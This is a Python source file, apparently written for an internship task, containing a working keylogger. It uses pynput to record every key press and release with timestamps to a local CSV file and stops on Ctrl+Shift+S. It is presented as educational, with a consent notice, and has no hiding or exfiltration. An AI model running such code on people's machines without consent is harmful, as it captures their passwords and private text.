"""
Educational Keylogger - CSV Logger
Author: Darshan Gholap (for Prodigy Infotech Internship Task)
Purpose: Demonstrate keylogging concepts ethically and safely.

⚠️ Use only in controlled environments with consent.
"""

import csv
import os
import datetime
from pynput import keyboard

# ==========================================================
# CONFIGURATION
# ==========================================================
LOG_DIR = "keylogs"
LOG_FILE = os.path.join(LOG_DIR, "keylog.csv")

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# ==========================================================
# STATE VARIABLES
# ==========================================================
keys_pressed = set()

# Include both left/right versions of Ctrl & Shift
stop_combo = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift_l,
    keyboard.Key.shift_r,
    keyboard.KeyCode(char='s')
}

# ==========================================================
# CSV HEADER SETUP
# ==========================================================
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "Action", "Key"])

# ==========================================================
# LOGGING FUNCTIONS
# ==========================================================
def log_event(action, key):
    """Log a key press/release event to the CSV file."""
    try:
        if hasattr(key, "char") and key.char is not None:
            key_str = key.char
        else:
            key_str = str(key)
    except Exception:
        key_str = str(key)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(LOG_FILE, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, action, key_str])

# ==========================================================
# EVENT HANDLERS
# ==========================================================
def on_press(key):
    """Handle key press events."""
    keys_pressed.add(key)
    log_event("PRESSED", key)

    # Check if all stop keys are pressed together
    if all(k in keys_pressed for k in stop_combo):
        print("\n🛑 Stop combo detected (Ctrl + Shift + S). Saving and exiting...")
        return False  # Stop the listener


def on_release(key):
    """Handle key release events."""
    if key in keys_pressed:
        keys_pressed.remove(key)
    log_event("RELEASED", key)

# ==========================================================
# MAIN FUNCTION
# ==========================================================
def main():
    print("=" * 60)
    print("🎯 Educational Keylogger Started")
    print(f"📂 Logging to: {LOG_FILE}")
    print("💡 Press Ctrl + Shift + S to stop and save logs.")
    print("=" * 60)

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n🛑 KeyboardInterrupt received. Stopping gracefully.")
    finally:
        print("✅ All keystrokes saved. Exiting safely.\n")

# ==========================================================
# ENTRY POINT
# ==========================================================
if __name__ == "__main__":
    main()
